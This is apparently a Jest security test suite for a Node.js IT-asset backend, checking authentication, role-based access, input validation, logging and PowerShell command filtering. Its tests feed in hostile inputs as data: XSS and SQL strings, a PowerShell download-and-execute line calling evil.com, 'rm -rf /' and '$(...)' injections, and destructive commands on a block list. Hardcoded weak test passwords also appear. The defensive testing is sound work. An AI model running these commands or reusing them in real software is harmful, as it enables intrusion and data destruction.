/**
 * Comprehensive Security Test Suite for Enhanced ServiceGrid Backend
 * Tests authentication, authorization, rate limiting, input validation, and PowerShell integration
 */
const request = require('supertest');
const path = require('path');\n\n// Import the enhanced server\nconst app = require('./enhanced-secure-server');\nconst { pool } = require('./services/enhanced-database');\nconst { powerShellIntegration } = require('./services/powershell-integration');\n\n// Test configuration\nconst TEST_CONFIG = {\n  testUser: {\n    username: 'testuser',\n    password: 'TestPassword123!',\n    role: 'operator'\n  },\n  adminUser: {\n    username: 'admin',\n    password: 'admin123',\n    role: 'administrator'\n  },\n  readonlyUser: {\n    username: 'readonly',\n    password: 'readonly123',\n    role: 'readonly'\n  }\n};\n\nlet testTokens = {};\n\ndescribe('Enhanced Security Test Suite', () => {\n  \n  beforeAll(async () => {\n    // Initialize database pool\n    await pool.initialize();\n    \n    // Create test users if they don't exist\n    await createTestUsers();\n    \n    console.log('✅ Test environment initialized');\n  });\n  \n  afterAll(async () => {\n    // Cleanup\n    await pool.close();\n    await powerShellIntegration.killAllProcesses();\n    \n    console.log('✅ Test environment cleaned up');\n  });\n  \n  describe('🔒 Authentication Security', () => {\n    \n    test('Should successfully authenticate with valid credentials', async () => {\n      const response = await request(app)\n        .post('/api/auth/login')\n        .send({\n          username: TEST_CONFIG.adminUser.username,\n          password: TEST_CONFIG.adminUser.password\n        })\n        .expect(200);\n      \n      expect(response.body.success).toBe(true);\n      expect(response.body.data.accessToken).toBeDefined();\n      expect(response.body.data.user.username).toBe(TEST_CONFIG.adminUser.username);\n      \n      // Store token for future tests\n      testTokens.admin = response.body.data.accessToken;\n      \n      console.log('✅ Valid authentication test passed');\n    });\n    \n    test('Should reject invalid credentials', async () => {\n      const response = await request(app)\n        .post('/api/auth/login')\n        .send({\n          username: TEST_CONFIG.adminUser.username,\n          password: 'wrongpassword'\n        })\n        .expect(401);\n      \n      expect(response.body.success).toBe(false);\n      expect(response.body.error.code).toBe('INVALID_CREDENTIALS');\n      \n      console.log('✅ Invalid credentials test passed');\n    });\n    \n    test('Should enforce rate limiting on authentication attempts', async () => {\n      const promises = [];\n      \n      // Make multiple rapid requests\n      for (let i = 0; i < 12; i++) {\n        promises.push(\n          request(app)\n            .post('/api/auth/login')\n            .send({\n              username: 'nonexistent',\n              password: 'wrongpassword'\n            })\n        );\n      }\n      \n      const responses = await Promise.all(promises);\n      \n      // Should have some 429 responses (rate limited)\n      const rateLimitedResponses = responses.filter(r => r.status === 429);\n      expect(rateLimitedResponses.length).toBeGreaterThan(0);\n      \n      console.log('✅ Rate limiting test passed');\n    });\n    \n    test('Should require authorization header for protected routes', async () => {\n      const response = await request(app)\n        .get('/api/auth/me')\n        .expect(401);\n      \n      expect(response.body.error.code).toBe('MISSING_TOKEN');\n      \n      console.log('✅ Authorization requirement test passed');\n    });\n    \n    test('Should reject invalid JWT tokens', async () => {\n      const response = await request(app)\n        .get('/api/auth/me')\n        .set('Authorization', 'Bearer invalid-token')\n        .expect(403);\n      \n      expect(response.body.error.code).toBe('INVALID_TOKEN');\n      \n      console.log('✅ Invalid token test passed');\n    });\n    \n  });\n  \n  describe('🛡️ Role-Based Access Control', () => {\n    \n    beforeAll(async () => {\n      // Get tokens for different user roles\n      const adminResponse = await request(app)\n        .post('/api/auth/login')\n        .send({\n          username: TEST_CONFIG.adminUser.username,\n          password: TEST_CONFIG.adminUser.password\n        });\n      \n      testTokens.admin = adminResponse.body.data.accessToken;\n      \n      // Create and authenticate test users\n      await createTestUser(TEST_CONFIG.testUser);\n      const operatorResponse = await request(app)\n        .post('/api/auth/login')\n        .send({\n          username: TEST_CONFIG.testUser.username,\n          password: TEST_CONFIG.testUser.password\n        });\n      \n      testTokens.operator = operatorResponse.body.data.accessToken;\n    });\n    \n    test('Admin should access all endpoints', async () => {\n      const response = await request(app)\n        .get('/api/admin/system-stats')\n        .set('Authorization', `Bearer ${testTokens.admin}`)\n        .expect(200);\n      \n      expect(response.body.success).toBe(true);\n      expect(response.body.data.server).toBeDefined();\n      \n      console.log('✅ Admin access test passed');\n    });\n    \n    test('Operator should not access admin endpoints', async () => {\n      const response = await request(app)\n        .get('/api/admin/system-stats')\n        .set('Authorization', `Bearer ${testTokens.operator}`)\n        .expect(403);\n      \n      expect(response.body.error.code).toBe('INSUFFICIENT_PERMISSIONS');\n      \n      console.log('✅ Operator restriction test passed');\n    });\n    \n    test('Operator should access asset management', async () => {\n      const response = await request(app)\n        .get('/api/assets')\n        .set('Authorization', `Bearer ${testTokens.operator}`)\n        .expect(200);\n      \n      expect(response.body.data).toBeDefined();\n      \n      console.log('✅ Operator asset access test passed');\n    });\n    \n  });\n  \n  describe('🔍 Input Validation and Sanitization', () => {\n    \n    test('Should sanitize malicious input', async () => {\n      const maliciousData = {\n        name: '<script>alert(\"xss\")</script>',\n        description: 'SELECT * FROM users; DROP TABLE assets;',\n        type: 'Server',\n        asset_tag: 'SRV-999',\n        status: 'Active'\n      };\n      \n      const response = await request(app)\n        .post('/api/assets')\n        .set('Authorization', `Bearer ${testTokens.admin}`)\n        .send(maliciousData)\n        .expect(400); // Should be rejected due to validation\n      \n      expect(response.body.error.type).toBe('VALIDATION_ERROR');\n      \n      console.log('✅ Input sanitization test passed');\n    });\n    \n    test('Should reject oversized requests', async () => {\n      const largeData = {\n        name: 'A'.repeat(1000000), // 1MB of data\n        type: 'Server',\n        asset_tag: 'SRV-998',\n        status: 'Active'\n      };\n      \n      const response = await request(app)\n        .post('/api/assets')\n        .set('Authorization', `Bearer ${testTokens.admin}`)\n        .send(largeData)\n        .expect(413);\n      \n      expect(response.body.error.code).toBe('REQUEST_TOO_LARGE');\n      \n      console.log('✅ Request size limit test passed');\n    });\n    \n    test('Should require proper Content-Type header', async () => {\n      const response = await request(app)\n        .post('/api/assets')\n        .set('Authorization', `Bearer ${testTokens.admin}`)\n        .set('Content-Type', 'text/plain')\n        .send('invalid data')\n        .expect(400);\n      \n      expect(response.body.error.code).toBe('INVALID_CONTENT_TYPE');\n      \n      console.log('✅ Content-Type validation test passed');\n    });\n    \n  });\n  \n  describe('⚡ PowerShell Integration Security', () => {\n    \n    test('Should validate script paths', async () => {\n      try {\n        await powerShellIntegration.executeScript('/invalid/path/script.ps1');\n        fail('Should have thrown an error');\n      } catch (error) {\n        expect(error.message).toContain('not found');\n      }\n      \n      console.log('✅ Script path validation test passed');\n    });\n    \n    test('Should block dangerous commands', async () => {\n      const dangerousCommands = [\n        'Remove-Computer',\n        'Format-Volume C:',\n        'Stop-Computer',\n        'Restart-Computer'\n      ];\n      \n      for (const command of dangerousCommands) {\n        try {\n          await powerShellIntegration.executeCommand(command);\n          fail(`Should have blocked command: ${command}`);\n        } catch (error) {\n          expect(error.message).toContain('blocked');\n        }\n      }\n      \n      console.log('✅ Dangerous command blocking test passed');\n    });\n    \n    test('Should detect suspicious patterns', async () => {\n      const suspiciousCommands = [\n        'Invoke-Expression \"malicious code\"',\n        'IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com\")',\n        'Start-Process cmd -WindowStyle Hidden'\n      ];\n      \n      for (const command of suspiciousCommands) {\n        try {\n          await powerShellIntegration.executeCommand(command);\n          fail(`Should have detected suspicious pattern: ${command}`);\n        } catch (error) {\n          expect(error.message).toContain('suspicious');\n        }\n      }\n      \n      console.log('✅ Suspicious pattern detection test passed');\n    });\n    \n    test('Should sanitize parameters', async () => {\n      const maliciousParams = {\n        'valid_param': 'safe_value',\n        'invalid;param': 'value',\n        'normal_param': 'value; rm -rf /',\n        'script_injection': '$(evil_command)'\n      };\n      \n      try {\n        const sanitized = powerShellIntegration.sanitizeParameters(maliciousParams);\n        \n        expect(sanitized['valid_param']).toBe('safe_value');\n        expect(sanitized['invalid;param']).toBeUndefined();\n        expect(sanitized['normal_param']).not.toContain(';');\n        expect(sanitized['script_injection']).not.toContain('$');\n      } catch (error) {\n        expect(error.message).toContain('Invalid parameter');\n      }\n      \n      console.log('✅ Parameter sanitization test passed');\n    });\n    \n    test('Should enforce execution timeout', async () => {\n      const startTime = Date.now();\n      \n      try {\n        await powerShellIntegration.executeCommand('Start-Sleep -Seconds 10', {\n          timeout: 2000 // 2 second timeout\n        });\n        fail('Should have timed out');\n      } catch (error) {\n        expect(error.message).toContain('timeout');\n        expect(Date.now() - startTime).toBeLessThan(5000);\n      }\n      \n      console.log('✅ Execution timeout test passed');\n    });\n    \n  });\n  \n  describe('📊 Audit Logging and Monitoring', () => {\n    \n    test('Should log authentication events', async () => {\n      // Perform login\n      await request(app)\n        .post('/api/auth/login')\n        .send({\n          username: TEST_CONFIG.adminUser.username,\n          password: TEST_CONFIG.adminUser.password\n        });\n      \n      // Check audit logs\n      const response = await request(app)\n        .get('/api/admin/audit-logs?eventType=LOGIN_SUCCESS')\n        .set('Authorization', `Bearer ${testTokens.admin}`)\n        .expect(200);\n      \n      expect(response.body.data.logs.length).toBeGreaterThan(0);\n      \n      console.log('✅ Authentication logging test passed');\n    });\n    \n    test('Should log security events', async () => {\n      // Trigger a security event (invalid login)\n      await request(app)\n        .post('/api/auth/login')\n        .send({\n          username: 'nonexistent',\n          password: 'wrongpassword'\n        });\n      \n      // Check security logs\n      const response = await request(app)\n        .get('/api/admin/security-logs')\n        .set('Authorization', `Bearer ${testTokens.admin}`)\n        .expect(200);\n      \n      expect(response.body.data.logs.length).toBeGreaterThan(0);\n      \n      console.log('✅ Security logging test passed');\n    });\n    \n    test('Should provide system metrics', async () => {\n      const response = await request(app)\n        .get('/api/admin/system-stats')\n        .set('Authorization', `Bearer ${testTokens.admin}`)\n        .expect(200);\n      \n      expect(response.body.data.server.uptime).toBeDefined();\n      expect(response.body.data.database).toBeDefined();\n      \n      console.log('✅ System metrics test passed');\n    });\n    \n  });\n  \n  describe('🏥 Health and Performance', () => {\n    \n    test('Should respond to health checks', async () => {\n      const response = await request(app)\n        .get('/api/health')\n        .expect(200);\n      \n      expect(response.body.status).toBe('healthy');\n      expect(response.body.database.connected).toBe(true);\n      \n      console.log('✅ Health check test passed');\n    });\n    \n    test('Should include security headers', async () => {\n      const response = await request(app)\n        .get('/api/health');\n      \n      expect(response.headers['x-content-type-options']).toBe('nosniff');\n      expect(response.headers['x-frame-options']).toBe('DENY');\n      expect(response.headers['x-request-id']).toBeDefined();\n      \n      console.log('✅ Security headers test passed');\n    });\n    \n    test('Should handle CORS properly', async () => {\n      const response = await request(app)\n        .options('/api/health')\n        .set('Origin', 'http://localhost:3001')\n        .expect(204);\n      \n      expect(response.headers['access-control-allow-origin']).toBe('http://localhost:3001');\n      \n      console.log('✅ CORS handling test passed');\n    });\n    \n  });\n  \n});\n\n// Helper functions\nasync function createTestUsers() {\n  const users = [\n    TEST_CONFIG.testUser,\n    TEST_CONFIG.readonlyUser\n  ];\n  \n  for (const user of users) {\n    await createTestUser(user);\n  }\n}\n\nasync function createTestUser(userData) {\n  try {\n    // Check if user already exists\n    const existing = await pool.query(\n      'SELECT user_id FROM users WHERE username = ?',\n      [userData.username]\n    );\n    \n    if (existing.length === 0) {\n      const { hashPassword } = require('./middleware/enhanced-security');\n      const hashedPassword = await hashPassword(userData.password);\n      \n      await pool.query(`\n        INSERT INTO users (\n          username, password_hash, role, email, display_name, active\n        ) VALUES (?, ?, ?, ?, ?, 1)\n      `, [\n        userData.username,\n        hashedPassword,\n        userData.role,\n        `${userData.username}@test.com`,\n        userData.username.charAt(0).toUpperCase() + userData.username.slice(1)\n      ]);\n      \n      console.log(`Created test user: ${userData.username}`);\n    }\n  } catch (error) {\n    console.warn(`Failed to create test user ${userData.username}:`, error.message);\n  }\n}\n\n// Run tests if this file is executed directly\nif (require.main === module) {\n  console.log('🚀 Starting Enhanced Security Test Suite...');\n  \n  // Set test environment\n  process.env.NODE_ENV = 'test';\n  process.env.DB_PATH = './backend/db/test-itsm.sqlite';\n  \n  // Run Jest programmatically\n  const jest = require('jest');\n  jest.run(['--testPathPattern=test-enhanced-security.js', '--verbose']);\n}\n\nmodule.exports = {\n  TEST_CONFIG,\n  createTestUser\n};"